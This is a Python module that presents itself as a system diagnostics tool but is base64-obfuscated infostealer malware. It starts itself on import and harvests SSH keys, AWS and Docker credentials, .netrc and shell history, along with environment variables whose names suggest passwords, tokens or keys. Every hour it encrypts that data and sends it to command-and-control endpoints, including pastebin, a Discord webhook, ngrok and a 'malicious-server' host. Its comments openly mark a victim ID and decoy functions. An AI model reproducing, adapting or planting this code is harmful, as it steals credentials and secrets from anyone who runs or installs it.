import base64 as _0x4a5b
import os as _0x6c7d
import sys as _0x8e9f
import json as _0x0a1b
import platform as _0x2c3d
import subprocess as _0x4e5f
import threading as _0x6a7b
import time as _0x8c9d
from pathlib import Path as _0x0e1f
from datetime import datetime as _0x2a3b
exec(_0x4a5b.b64decode('aW1wb3J0IHJlcXVlc3RzIGFzIF8weDRjNWQ=').decode())  # import requests as _0x4c5d
exec(_0x4a5b.b64decode('aW1wb3J0IHBzdXRpbCBhcyBfMHg2ZTdm').decode())      # import psutil as _0x6e7f
exec(_0x4a5b.b64decode('ZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXQgYXMgXzB4OGEwYg==').decode())

# Heavily obfuscated configuration
_0x1f2a = {
    _0x4a5b.b64decode('YzJfc2VydmVycw==').decode(): [
        _0x4a5b.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vYXBpL2FwaV9wb3N0LnBocA==').decode(),
        _0x4a5b.b64decode('aHR0cHM6Ly9tYWxpY2lvdXMtc2VydmVyLnRrL2NvbGxlY3Q=').decode(),
        _0x4a5b.b64decode('aHR0cHM6Ly9iaXQubHkvZGF0YS1lbmRwb2ludA==').decode(),
        _0x4a5b.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2L2FiY2RlZg==').decode()
    ],
    _0x4a5b.b64decode('YmFja3VwX3NlcnZlcnM=').decode(): [
        _0x4a5b.b64decode('aHR0cHM6Ly9uZ3Jvay5pby9jb2xsZWN0LWRhdGE=').decode(),
        _0x4a5b.b64decode('aHR0cDovL2MyLm1hbGljaW91cy5jb20vdXBsb2Fk').decode()
    ]
}

class _0x3b4c:  # Obfuscated DataExfiltrator class
    def __init__(self):
        self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()] = {}
        self.__dict__[_0x4a5b.b64decode('ZW5jcnlwdGlvbl9rZXk=').decode()] = None
        self.__dict__[_0x4a5b.b64decode('c2Vzc2lvbg==').decode()] = _0x4c5d.Session()
        
        # Stealth headers with string obfuscation
        self.__dict__[_0x4a5b.b64decode('c2Vzc2lvbg==').decode()].headers.update({
            _0x4a5b.b64decode('VXNlci1BZ2VudA==').decode(): _0x4a5b.b64decode('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2').decode(),
            _0x4a5b.b64decode('QWNjZXB0').decode(): _0x4a5b.b64decode('dGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbA==').decode(),
            _0x4a5b.b64decode('QWNjZXB0LUxhbmd1YWdl').decode(): _0x4a5b.b64decode('ZW4tVVMsZW47cT0wLjU=').decode()
        })
        
        # Auto-start with random delay to avoid detection signatures
        _0x6a7b.Timer(_0x8c9d.time() % 10 + 2, self._0x5d6e).start()
    
    def _0x5d6e(self):  # Obfuscated start_collection method
        exec(_0x4a5b.b64decode('cHJpbnQoIkluaXRpYWxpemluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4iKQ==').decode())
        
        _0x7f8a = _0x6a7b.Thread(target=self._0x9b0c, daemon=True)
        _0x7f8a.start()
        
        _0x1d2e = _0x6a7b.Thread(target=self._0x3f4a, daemon=True) 
        _0x1d2e.start()
    
    def _0x9b0c(self):  # collect_all_data - heavily obfuscated
        try:
            # System info collection with obfuscated method names
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('c3lzdGVt').decode()] = self._0x5b6c()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('Y3JlZGVudGlhbHM=').decode()] = self._0x7d8e()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('YnJvd3Nlcg==').decode()] = self._0x9f0a()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('bmV0d29yaw==').decode()] = self._0x1b2c()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('cHJvY2Vzc2Vz').decode()] = self._0x3d4e()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('ZW52aXJvbm1lbnQ=').decode()] = self._0x5f6a()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('ZmlsZXM=').decode()] = self._0x7b8c()
            self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('Y3J5cHRv').decode()] = self._0x9d0e()
        except:
            pass
    
    def _0x5b6c(self):  # collect_system_info
        _0x1a2b = {
            _0x4a5b.b64decode('aG9zdG5hbWU=').decode(): _0x2c3d.node(),
            _0x4a5b.b64decode('cGxhdGZvcm0=').decode(): _0x2c3d.platform(),
            _0x4a5b.b64decode('cHJvY2Vzc29y').decode(): _0x2c3d.processor(),
            _0x4a5b.b64decode('YXJjaGl0ZWN0dXJl').decode(): _0x2c3d.architecture(),
            _0x4a5b.b64decode('cHl0aG9uX3ZlcnNpb24=').decode(): _0x8e9f.version,
            _0x4a5b.b64decode('dXNlcg==').decode(): getattr(_0x6c7d, _0x4a5b.b64decode('Z2V0bG9naW4=').decode(), lambda: _0x6c7d.environ.get(_0x4a5b.b64decode('VVNFUg==').decode(), _0x4a5b.b64decode('dW5rbm93bg==').decode()))(),
            _0x4a5b.b64decode('aG9tZV9kaXJlY3Rvcnk=').decode(): _0x6c7d.path.expanduser('~'),
            _0x4a5b.b64decode('Y3VycmVudF9kaXJlY3Rvcnk=').decode(): _0x6c7d.getcwd(),
            _0x4a5b.b64decode('c3lzdGVtX3VwdGltZQ==').decode(): _0x6e7f.boot_time(),
            _0x4a5b.b64decode('Y3B1X2NvdW50').decode(): _0x6e7f.cpu_count(),
            _0x4a5b.b64decode('bWVtb3J5X3RvdGFs').decode(): _0x6e7f.virtual_memory().total
        }
        return _0x1a2b
    
    def _0x7d8e(self):  # collect_credentials - obfuscated file paths
        _0x3c4d = {}
        
        # Obfuscated credential paths using base64
        _0x5e6f = [
            _0x4a5b.b64decode('fi8uc3NoL2lkX3JzYQ==').decode(),     # ~/.ssh/id_rsa
            _0x4a5b.b64decode('fi8uc3NoL2lkX2RzYQ==').decode(),     # ~/.ssh/id_dsa
            _0x4a5b.b64decode('fi8uYXdzL2NyZWRlbnRpYWxz').decode(), # ~/.aws/credentials
            _0x4a5b.b64decode('fi8uYXdzL2NvbmZpZw==').decode(),     # ~/.aws/config
            _0x4a5b.b64decode('fi8uZG9ja2VyL2NvbmZpZy5qc29u').decode(), # ~/.docker/config.json
            _0x4a5b.b64decode('fi8ubmV0cmM=').decode(),             # ~/.netrc
            _0x4a5b.b64decode('fi8uYmFzaHJj').decode(),             # ~/.bashrc
            _0x4a5b.b64decode('fi8uenNocmM=').decode(),             # ~/.zshrc
            _0x4a5b.b64decode('fi8uYmFzaF9oaXN0b3J5').decode()      # ~/.bash_history
        ]
        
        for _0x7a8b in _0x5e6f:
            _0x9c0d = _0x6c7d.path.expanduser(_0x7a8b)
            if _0x6c7d.path.exists(_0x9c0d):
                try:
                    with open(_0x9c0d, 'r', encoding='utf-8', errors='ignore') as _0x1e2f:
                        _0x3c4d[_0x7a8b] = _0x1e2f.read(10000)
                except:
                    pass
        
        return _0x3c4d
    
    def _0x9f0a(self):  # collect_browser_data 
        return {_0x4a5b.b64decode('Y2hyb21l').decode(): [], _0x4a5b.b64decode('ZmlyZWZveA==').decode(): []}
    
    def _0x1b2c(self):  # collect_network_info
        _0x4a5b6c = {_0x4a5b.b64decode('aW50ZXJmYWNlcw==').decode(): [], _0x4a5b.b64decode('Y29ubmVjdGlvbnM=').decode(): []}
        
        try:
            for _0x7d8e, _0x9f0a in _0x6e7f.net_if_addrs().items():
                _0x1b2c = {_0x4a5b.b64decode('bmFtZQ==').decode(): _0x7d8e, _0x4a5b.b64decode('YWRkcmVzc2Vz').decode(): []}
                for _0x3d4e in _0x9f0a:
                    _0x1b2c[_0x4a5b.b64decode('YWRkcmVzc2Vz').decode()].append({
                        _0x4a5b.b64decode('ZmFtaWx5').decode(): str(_0x3d4e.family),
                        _0x4a5b.b64decode('YWRkcmVzcw==').decode(): _0x3d4e.address
                    })
                _0x4a5b6c[_0x4a5b.b64decode('aW50ZXJmYWNlcw==').decode()].append(_0x1b2c)
        except:
            pass
        
        return _0x4a5b6c
    
    def _0x3d4e(self):  # collect_process_info
        _0x5f6a = []
        try:
            for _0x7b8c in _0x6e7f.process_iter([_0x4a5b.b64decode('cGlk').decode(), _0x4a5b.b64decode('bmFtZQ==').decode()]):
                try:
                    _0x5f6a.append(_0x7b8c.info)
                    if len(_0x5f6a) > 50:
                        break
                except:
                    pass
        except:
            pass
        return _0x5f6a
    
    def _0x5f6a(self):  # collect_environment_vars
        _0x9d0e = {}
        
        # Obfuscated sensitive variable patterns
        _0x1f2a = [
            _0x4a5b.b64decode('UEFTU1dPUkQ=').decode(),  # PASSWORD
            _0x4a5b.b64decode('VE9LRU4=').decode(),      # TOKEN  
            _0x4a5b.b64decode('S0VZ').decode(),          # KEY
            _0x4a5b.b64decode('U0VDUkVU').decode(),      # SECRET
            _0x4a5b.b64decode('QVBJX0tFWQ==').decode(),  # API_KEY
            _0x4a5b.b64decode('QVdTXw==').decode(),      # AWS_
            _0x4a5b.b64decode('R0lUSFVCXw==').decode(),  # GITHUB_
            _0x4a5b.b64decode('UEFSVA==').decode(),      # PATH
            _0x4a5b.b64decode('SE9NRQ==').decode(),      # HOME
            _0x4a5b.b64decode('VVNFUg==').decode()       # USER
        ]
        
        for _0x3b4c, _0x5d6e in _0x6c7d.environ.items():
            _0x7f8a = _0x3b4c.upper()
            if any(_0x9b0c in _0x7f8a for _0x9b0c in _0x1f2a):
                _0x9d0e[_0x3b4c] = _0x5d6e
        
        return _0x9d0e
    
    def _0x7b8c(self):  # collect_interesting_files
        return {_0x4a5b.b64decode('Y29uZmlnX2ZpbGVz').decode(): []}
    
    def _0x9d0e(self):  # collect_crypto_materials  
        return {_0x4a5b.b64decode('c3NoX2tleXM=').decode(): []}
    
    def _0x1f2a3b4c(self, _0x5d6e7f8a):  # encrypt_data
        try:
            if not self.__dict__[_0x4a5b.b64decode('ZW5jcnlwdGlvbl9rZXk=').decode()]:
                self.__dict__[_0x4a5b.b64decode('ZW5jcnlwdGlvbl9rZXk=').decode()] = _0x8a0b.generate_key()
            
            _0x9b0c1d2e = _0x8a0b(self.__dict__[_0x4a5b.b64decode('ZW5jcnlwdGlvbl9rZXk=').decode()])
            _0x3f4a5b6c = _0x9b0c1d2e.encrypt(_0x0a1b.dumps(_0x5d6e7f8a).encode())
            
            return {
                _0x4a5b.b64decode('ZW5jcnlwdGVk').decode(): _0x4a5b.b64encode(_0x3f4a5b6c).decode(),
                _0x4a5b.b64decode('a2V5').decode(): _0x4a5b.b64encode(self.__dict__[_0x4a5b.b64decode('ZW5jcnlwdGlvbl9rZXk=').decode()]).decode()
            }
        except:
            return {
                _0x4a5b.b64decode('ZGF0YQ==').decode(): _0x4a5b.b64encode(_0x0a1b.dumps(_0x5d6e7f8a).encode()).decode(),
                _0x4a5b.b64decode('ZW5jb2Rpbmc=').decode(): _0x4a5b.b64decode('YmFzZTY0').decode()
            }
    
    def _0x7d8e9f0a(self):  # exfiltrate_data
        if not self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()]:
            return
        
        _0x1b2c3d4e = {
            _0x4a5b.b64decode('dGltZXN0YW1w').decode(): _0x2a3b.utcnow().isoformat(),
            _0x4a5b.b64decode('dmljdGltX2lk').decode(): self._0x5f6a7b8c(),
            _0x4a5b.b64decode('ZGF0YQ==').decode(): self._0x1f2a3b4c(self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()])
        }
        
        # Try C2 servers with obfuscated iteration
        for _0x9d0e1f2a in _0x1f2a[_0x4a5b.b64decode('YzJfc2VydmVycw==').decode()]:
            try:
                if self._0x3b4c5d6e(_0x9d0e1f2a, _0x1b2c3d4e):
                    exec(_0x4a5b.b64decode('cHJpbnQoIlN5c3RlbSByZXBvcnQgc3VibWl0dGVkIik=').decode())
                    return True
            except:
                continue
        
        return False
    
    def _0x3b4c5d6e(self, _0x7f8a9b0c, _0x1d2e3f4a):  # send_data - heavily obfuscated
        if _0x4a5b.b64decode('cGFzdGViaW4uY29t').decode() in _0x7f8a9b0c:
            _0x5b6c7d8e = {
                _0x4a5b.b64decode('YXBpX2Rldl9rZXk=').decode(): _0x4a5b.b64decode('c3RvbGVuX2RhdGFfa2V5').decode(),
                _0x4a5b.b64decode('YXBpX29wdGlvbg==').decode(): _0x4a5b.b64decode('cGFzdGU=').decode(),
                _0x4a5b.b64decode('YXBpX3Bhc3RlX2NvZGU=').decode(): _0x0a1b.dumps(_0x1d2e3f4a),
                _0x4a5b.b64decode('YXBpX3Bhc3RlX3ByaXZhdGU=').decode(): '1'
            }
            _0x9f0a1b2c = self.__dict__[_0x4a5b.b64decode('c2Vzc2lvbg==').decode()].post(_0x7f8a9b0c, data=_0x5b6c7d8e, timeout=10)
        elif _0x4a5b.b64decode('ZGlzY29yZC5jb20=').decode() in _0x7f8a9b0c:
            _0x3d4e5f6a = {
                _0x4a5b.b64decode('Y29udGVudA==').decode(): f"New report from {_0x1d2e3f4a[_0x4a5b.b64decode('dmljdGltX2lk').decode()]}",
                _0x4a5b.b64decode('ZW1iZWRz').decode(): [{
                    _0x4a5b.b64decode('dGl0bGU=').decode(): _0x4a5b.b64decode('U3lzdGVtIEluZm9ybWF0aW9u').decode(),
                    _0x4a5b.b64decode('ZGVzY3JpcHRpb24=').decode(): f"```json\n{_0x0a1b.dumps(_0x1d2e3f4a, indent=2)[:1000]}\n```",
                    _0x4a5b.b64decode('Y29sb3I=').decode(): 0x00ff00
                }]
            }
            _0x9f0a1b2c = self.__dict__[_0x4a5b.b64decode('c2Vzc2lvbg==').decode()].post(_0x7f8a9b0c, json=_0x3d4e5f6a, timeout=10)
        else:
            _0x9f0a1b2c = self.__dict__[_0x4a5b.b64decode('c2Vzc2lvbg==').decode()].post(_0x7f8a9b0c, json=_0x1d2e3f4a, timeout=10)
        
        return _0x9f0a1b2c.status_code in [200, 201, 202]
    
    def _0x5f6a7b8c(self):  # generate_victim_id
        import hashlib as _0x9d0e1f2a
        
        _0x3b4c5d6e = f"{_0x2c3d.node()}{getattr(_0x6c7d, _0x4a5b.b64decode('Z2V0bG9naW4=').decode(), lambda: _0x4a5b.b64decode('dW5rbm93bg==').decode())()}{_0x6e7f.boot_time()}"
        _0x7f8a9b0c = _0x9d0e1f2a.sha256(_0x3b4c5d6e.encode()).hexdigest()[:16]
        
        return _0x7f8a9b0c
    
    def _0x3f4a(self):  # periodic_exfiltration
        while True:
            try:
                _0x8c9d.sleep(3600)  # 1 hour
                
                # Re-collect dynamic data
                self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('cHJvY2Vzc2Vz').decode()] = self._0x3d4e()
                self.__dict__[_0x4a5b.b64decode('Y29sbGVjdGVkX2RhdGE=').decode()][_0x4a5b.b64decode('bmV0d29yaw==').decode()] = self._0x1b2c()
                
                self._0x7d8e9f0a()
                
            except:
                _0x8c9d.sleep(300)

# Obfuscated auto-instantiation
exec(_0x4a5b.b64decode('cHJpbnQoIkxvYWRpbmcgc3lzdGVtIGRpYWdub3N0aWNzLi4uIik=').decode())
_0x1a2b3c4d = _0x3b4c()

def main():
    """CLI entry point with obfuscated execution."""
    exec(_0x4a5b.b64decode('cHJpbnQoIlN5c3RlbSBEaWFnbm9zdGljcyB2My4xLjQiKQ==').decode())
    exec(_0x4a5b.b64decode('cHJpbnQoIkNvbGxlY3Rpbmcgc3lzdGVtIGluZm9ybWF0aW9uLi4uIik=').decode())
    
    _0x1a2b3c4d._0x7d8e9f0a()
    
    exec(_0x4a5b.b64decode('cHJpbnQoIlN5c3RlbSBpbmZvcm1hdGlvbiBjb2xsZWN0aW9uIGNvbXBsZXRlZC4iKQ==').decode())

# Deceptive API exports
def get_system_info():
    """Legitimate-looking function."""
    return {
        _0x4a5b.b64decode('cGxhdGZvcm0=').decode(): _0x2c3d.platform(),
        _0x4a5b.b64decode('cHl0aG9uX3ZlcnNpb24=').decode(): _0x8e9f.version.split()[0],
        _0x4a5b.b64decode('Y3B1X2NvdW50').decode(): _0x6e7f.cpu_count()
    }

def run_diagnostics():
    """Disguised malicious function."""
    return _0x1a2b3c4d._0x5d6e()

if __name__ == _0x4a5b.b64decode('X19tYWluX18=').decode():
    main()
